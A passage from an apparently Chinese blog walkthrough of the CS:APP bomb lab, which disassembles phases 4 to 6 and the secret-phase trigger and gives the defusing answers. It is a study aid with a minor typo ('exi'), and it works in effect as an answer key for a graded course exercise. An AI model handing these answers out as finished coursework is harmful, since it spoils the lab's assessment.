class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span> <span class="hljs-params">( <span class="hljs-type">int</span> edi, <span class="hljs-type">int</span> esi, <span class="hljs-type">int</span> edx )</span> <span class="hljs-comment">//初始值:edi=x1,esi=0x0,edx=0xe</span><br>&#123;<span class="hljs-comment">// 返回值为eax</span><br>    eax = edx - esi;  <span class="hljs-comment">//3、4行</span><br>    eax = (eax + (eax &gt;&gt; <span class="hljs-number">31</span>)) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">//5-8行</span><br>    ecx = eax + exi;  <span class="hljs-comment">//9行</span><br>    <span class="hljs-keyword">if</span>(edi &lt; ecx) <br>        <span class="hljs-keyword">return</span>  <span class="hljs-number">2</span> * func4(edi, esi, edx - <span class="hljs-number">1</span>); <span class="hljs-comment">//14行</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (edi &gt; ecx)<br>        <span class="hljs-keyword">return</span>  <span class="hljs-number">2</span> * func4(edi, esi + <span class="hljs-number">1</span>, edx) + <span class="hljs-number">1</span>; <span class="hljs-comment">//21行</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span>  <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>发现x&#x3D;7直接满足条件</strong></p><p>答案7 0 </p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_5:<br>   0x0000000000401062 &lt;+0&gt;:     push   %rbx<br>   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp #32字节栈帧<br>   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx #输入存放在%rbx中<br>   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax  <br>   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp) #fs段偏移0x28存放到%rsp+0x18<br>   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax #eax置0<br>   0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt; <br>   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax #比较长度是否为6，不为6直接爆炸<br>   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;<br>   0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;<br>   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx #%ecx=%ebx+%rax<br>   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)<br>   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx<br>   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx #截断取最后四位<br>   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx<br>   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1) dl低4位到rsp+rax+10<br>   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax<br>   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax #%rax作为计数器<br>   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;<br>   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)<br>   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi<br>   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi<br>   0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;<br>   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax<br>   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;<br>   0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)<br>   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;<br>   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax <br>   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;<br>   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax<br>   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax<br>   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;<br>   0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;<br>   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp<br>   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx<br>   0x00000000004010f3 &lt;+145&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p><strong>0x4024b0处：maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</strong></p><p>+41到+74的代码使用gpt转换后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">phase_5</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* rbx)</span> &#123;<br>    <span class="hljs-type">int</span> rax = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> rsp_value;<br>    <span class="hljs-keyword">while</span> (rax != <span class="hljs-number">6</span>) &#123;<br>        <span class="hljs-type">char</span> ecx = rbx[rax];<br>        *(<span class="hljs-type">char</span>*)(&amp;rsp_value) = ecx;<br>        <span class="hljs-type">int</span> rdx = rsp_value;<br>        rdx &amp;= <span class="hljs-number">0xf</span>;<br>        <span class="hljs-type">int</span> edx = *(<span class="hljs-type">char</span>*)(<span class="hljs-number">0x4024b0</span> + rdx);<br>        *(<span class="hljs-type">char</span>*)(&amp;rsp_value + rax + <span class="hljs-number">0x10</span>) = edx;<br>        rax += <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>退出循环时，%rsp+10处以此存储着6个字符</p><p>继续看+76后的代码</p><p><strong>查看0x40245e</strong></p><p>字符串：flyers</p><p>调用strings_not_equal函数，判断栈上的六个字符是否与这个字符串的相等。</p><p>我们能够知道，这六个字符是通过我们输入的字符的ascii码的低4位作为索引，查找<strong>maduiersnfotvbyl</strong>这个i部分 的字符。</p><p>在<strong>maduiersnfotvbyl</strong>中，f为第9位，l第15位，y第14位，e第5位，r第6位，s第7位。</p><p>即我们输入的字符，其ascii码的低4位依次是1001,1111,1110,0101,0110,0111。</p><p>即答案为ionuvw</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r14<br>0x00000000004010f6 &lt;+2&gt;:     push   %r13<br>0x00000000004010f8 &lt;+4&gt;:     push   %r12<br>0x00000000004010fa &lt;+6&gt;:     push   %rbp<br>0x00000000004010fb &lt;+7&gt;:     push   %rbx<br>0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp<br>0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13<br>0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi<br>0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt; <br></code></pre></td></tr></table></figure><p>调用read_six_numbers函数，参考phase_2 </p><p>rsp处存放6个数字 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14<br>0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d<br>0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp<br>0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax<br>0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax<br>0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax<br>0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt; #输入[r13]-1&lt;=5跳转<br>0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt; #输入[r13]-1&gt;5直接爆<br>0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d <br>0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d <br>0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt; #跳出循环<br>0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx<br>0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax<br>0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax  <br>0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp) #输入[r12d]与输入[r13]比较  <br>0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt; #不相等跳转<br>0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt; #两数字相等才爆<br>0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx<br>0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx<br>0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;<br>0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13<br>0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;<br></code></pre></td></tr></table></figure><p>这一部分对输入的要求</p><ul><li>不大于6</li><li>互不相同</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi<br>0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax<br>0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx<br>0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx #edx=7<br>0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx <br>0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax) #<br>0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax<br>0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax<br>0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;<br></code></pre></td></tr></table></figure><p>这一part简单的c语言转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">rsi=<span class="hljs-number">0x18</span>(%rsp)<br><span class="hljs-keyword">for</span>(rax=%r14,rax&lt;rsi,rax++)<br> &#123;num[rax]=<span class="hljs-number">7</span>-n[rax]；&#125; <span class="hljs-comment">//假设输入数组名为n，变换后的为num</span><br></code></pre></td></tr></table></figure><p>可以看到这一part主要是对输入进行了简单的变换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi<br>0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;<br>0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx<br>0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax<br>0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax<br>0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;<br>0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;<br>0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx<br>0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2) #rsp=rsp+rsi*2+0x20<br>0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi #rsi+=0x4<br>0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi <br>0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt; #rsi=0x18跳转<br>0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx #ecx=rsp+rsi=num[rsi]<br>0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx  #ecx&lt;=1跳转<br>0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;<br>0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax #num[rsi]&gt;1<br>0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx<br>0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;<br></code></pre></td></tr></table></figure><ul><li><p>+163: <code>ecx=num[rsi]</code></p></li><li><p>+166:如果<code>num[0]=1</code>跳转</p></li><li><p>+143:查看0x6032d0内存空间</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">(gdb) x/<span class="hljs-number">24</span>x <span class="hljs-number">0x6032d0</span><br><span class="hljs-number">0x6032d0</span> &lt;node1&gt;:       <span class="hljs-number">0</span>x0000014c      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0</span>x<span class="hljs-number">006032e0</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032e0</span> &lt;node2&gt;:       <span class="hljs-number">0</span>x<span class="hljs-number">000000a8</span>      <span class="hljs-number">0x00000002</span>      <span class="hljs-number">0</span>x<span class="hljs-number">006032f0</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032f0</span> &lt;node3&gt;:       <span class="hljs-number">0</span>x0000039c      <span class="hljs-number">0x00000003</span>      <span class="hljs-number">0x00603300</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603300</span> &lt;node4&gt;:       <span class="hljs-number">0</span>x<span class="hljs-number">000002b3</span>      <span class="hljs-number">0x00000004</span>      <span class="hljs-number">0x00603310</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603310</span> &lt;node5&gt;:       <span class="hljs-number">0</span>x000001dd      <span class="hljs-number">0x00000005</span>      <span class="hljs-number">0x00603320</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603320</span> &lt;node6&gt;:       <span class="hljs-number">0</span>x000001bb      <span class="hljs-number">0x00000006</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span><br></code></pre></td></tr></table></figure><p>不难发现这是一个 <strong>链表结构</strong> 第一列是数值，第二列序号，第三列是下一个节点的地址</p></li><li><p>+148~+161: node[2]&#x3D;node[1]-&gt;next</p></li><li><p>+171:num[rsi]&gt;1时，eax&#x3D;1,edx&#x3D;0x6032d0，然后跳转</p></li><li><p>+130:rdx&#x3D;rdx+0x8,eax++,eax!&#x3D;ecx则一直循环</p></li><li><p>当ecx&#x3D;eax时，rsp&#x3D;node[num[i]]</p></li></ul><p>至此 我们可以发现，这一部分的操作是将指针移动到<strong>node[num[i]]处</strong>，即栈空间的依次存放着node[num[0]]~node[num[6]]。</p><p>此时<strong>栈空间</strong>的情况如下表所示</p><table><thead><tr><th align="center">栈地址</th><th align="center">内容</th></tr></thead><tbody><tr><td align="center">rsp+0x48</td><td align="center">node[num[5]]</td></tr><tr><td align="center">rsp+0x40</td><td align="center">node[num[4]]</td></tr><tr><td align="center">rsp+0x38</td><td align="center">node[num[3]]</td></tr><tr><td align="center">rsp+0x30</td><td align="center">node[num[2]]</td></tr><tr><td align="center">rsp+0x28</td><td align="center">node[num[1]]</td></tr><tr><td align="center">rsp+0x20</td><td align="center">node[num[0]]</td></tr><tr><td align="center">rsp+0x14</td><td align="center">num[5]</td></tr><tr><td align="center">rsp+0x10</td><td align="center">num[4]</td></tr><tr><td align="center">rsp+0xc</td><td align="center">num[3]</td></tr><tr><td align="center">rsp+0x8</td><td align="center">num[2]</td></tr><tr><td align="center">rsp+0x4</td><td align="center">num[1]</td></tr><tr><td align="center">rsp</td><td align="center">num[0]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx #rax=node[num[0]]<br>0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax #node[num[1]]<br>0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi <br>0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx #rcx=rbx=node[num[0]]<br>0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx #rdx= node[num[1]]<br>0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)<br>0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax<br>0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax<br>0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;<br>0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx<br>0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;<br></code></pre></td></tr></table></figure><p>这一部分将链表按栈内节点的位置顺序重新排列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)<br>0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp<br>0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax<br>0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax<br>0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)<br>0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;<br>0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx<br>0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp<br>0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;<br>0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp<br>0x00000000004011fb &lt;+263&gt;:   pop    %rbx<br>0x00000000004011fc &lt;+264&gt;:   pop    %rbp<br>0x00000000004011fd &lt;+265&gt;:   pop    %r12<br>0x00000000004011ff &lt;+267&gt;:   pop    %r13<br>0x0000000000401201 &lt;+269&gt;:   pop    %r14<br>0x0000000000401203 &lt;+271&gt;:   ret<br></code></pre></td></tr></table></figure><ul><li><code>rbx</code>指向<code>node[num[0]]</code>，<code>eax</code>指向<code>node[num[1]]</code>，如果<code>rbx&lt;eax</code>，爆炸，即<code>node[i]</code>对的值应该在栈中递减</li><li>根据node的值排序：<code>node[3]&gt;node[4]&gt;node[5]&gt;node[6]&gt;node[1]&gt;node[2]</code>，即对应<code>num[0]=3,num[1]=4,num[2]=5,num[3]=6,num[4]=1,num[5]=2</code></li><li>但前一部分中，需要对输入的进行变换（n&#x3D;7-num）才能得到num，所以最终答案是：<strong>4 3 2 1 6 5</strong></li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Congratulations! You&#x27;ve defused the bomb!<br></code></pre></td></tr></table></figure><p>至此bomb lab的6个phase全部完成。</p><h2 id="One-more-thing…"><a href="#One-more-thing…" class="headerlink" title="One more thing…"></a>One more thing…</h2><p>在<code>bomb.c</code>的最后有一段注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span><br><span class="hljs-comment">    * something they overlooked?  Mua ha ha ha ha! */</span><br></code></pre></td></tr></table></figure><p>查看<code>phase_defused</code>的汇编 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4015c4:48 83 ec 78          sub    $0x78,%rsp<br>4015c8:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>4015cf:00 00 <br>4015d1:48 89 44 24 68       mov    %rax,0x68(%rsp)<br>4015d6:31 c0                xor    %eax,%eax<br>4015d8:83 3d 81 21 20 00 06 cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;<br>4015df:75 5e                jne    40163f &lt;phase_defused+0x7b&gt;<br>4015e1:4c 8d 44 24 10       lea    0x10(%rsp),%r8<br>4015e6:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx<br>4015eb:48 8d 54 24 08       lea    0x8(%rsp),%rdx<br>4015f0:be 19 26 40 00       mov    $0x402619,%esi<br>4015f5:bf 70 38 60 00       mov    $0x603870,%edi<br>4015fa:e8 f1 f5 ff ff       call   400bf0 &lt;__isoc99_sscanf@plt&gt;<br>4015ff:83 f8 03             cmp    $0x3,%eax<br>401602:75 31                jne    401635 &lt;phase_defused+0x71&gt;<br>401604:be 22 26 40 00       mov    $0x402622,%esi<br>401609:48 8d 7c 24 10       lea    0x10(%rsp),%rdi<br>40160e:e8 25 fd ff ff       call   401338 &lt;strings_not_equal&gt;<br>401613:85 c0                test   %eax,%eax<br>401615:75 1e                jne    401635 &lt;phase_defused+0x71&gt;<br>401617:bf f8 24 40 00       mov    $0x4024f8,%edi<br>40161c:e8 ef f4 ff ff       call   400b10 &lt;puts@plt&gt;<br>401621:bf 20 25 40 00       mov    $0x402520,%edi<br>401626:e8 e5 f4 ff ff       call   400b10 &lt;puts@plt&gt;<br>40162b:b8 00 00 00 00       mov    $0x0,%eax<br>401630:e8 0d fc ff ff       call   401242 &lt;secret_phase&gt;<br>401635:bf 58 25 40 00       mov    $0x402558,%edi<br>40163a:e8 d1 f4 ff ff       call   400b10 &lt;puts@plt&gt;<br>40163f:48 8b 44 24 68       mov    0x68(%rsp),%rax<br>401644:64 48 33 04 25 28 00 xor    %fs:0x28,%rax<br>40164b:00 00 <br>40164d:74 05                je     401654 &lt;phase_defused+0x90&gt;<br>40164f:e8 dc f4 ff ff       call   400b30 &lt;__stack_chk_fail@plt&gt;<br>401654:48 83 c4 78          add    $0x78,%rsp<br>401658:c3                   ret    <br></code></pre></td></tr></table></figure><p>发现在 <code>phase_defused</code>中会调用<code>secret_phase</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/s 0x402619<br>0x402619:       &quot;%d %d %s&quot;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) x/s 0x402622<br>0x402622:       <span class="hljs-string">&quot;DrEvil&quot;</span><br></code></pre></td></tr></table></figure><p>不难猜测应该是在某个两个数字的后面加上一个字符串<code>DrEvil</code></p><p>经尝试发现在第四个答案后添加指定字符串可进入隐藏关</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Curses, you&#x27;ve found <span class="hljs-keyword">the</span> secret phase!<br>But finding <span class="hljs-keyword">it</span> <span class="hljs-keyword">and</span> solving <span class="hljs-keyword">it</span> are quite different...<br></code></pre></td></tr></table></figure><p>这里的<code>secret_phase</code>便是<strong>暗雷</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401242 &lt;secret_phase&gt;:<br>401242:53                   push   %rbx<br>401243:e8 56 02 00 00       call   40149e &lt;read_line&gt;<br>401248:ba 0a 00 00 00       mov    $0xa,%edx<br>40124d:be 00 00 00 00       mov    $0x0,%esi<br>401252:48 89 c7             mov    %rax,%rdi<br>401255:e8 76 f9 ff ff       call   400bd0 &lt;strtol@plt&gt;<br>40125a:48 89 c3             mov    %rax,%rbx<br>40125d:8d 40 ff             lea    -0x1(%rax),%eax<br>401260:3d e8 03 00 00       cmp    $0x3e8,%eax<br>401265:76 05                jbe    40126c &lt;secret_phase+0x2a&gt;<br>401267:e8 ce 01 00 00       call   40143a &lt;explode_bomb&gt;<br>40126c:89 de                mov    %ebx,%esi<br>40126e:bf f0 30 60 00       mov    $0x6030f0,%edi<br>401273:e8 8c ff ff ff       call   401204 &lt;fun7&gt;<br>401278:83 f8 02             cmp    $0x2,%eax<br>40127b:74 05                je     401282 &lt;secret_phase+0x40&gt;<br>40127d:e8 b8 01 00 00       call   40143a &lt;explode_bomb&gt;<br>401282:bf 38 24 40 00       mov    $0x402438,%edi<br>401287:e8 84 f8 ff ff       call   400b10 &lt;puts@plt&gt;<br>40128c:e8 33 03 00 00       call   4015c4 &lt;phase_defused&gt;<br>401291:5b                   pop    %rbx<br>401292:c3                   ret  <br></code></pre></td></tr></table></figure><ul><li>在第13 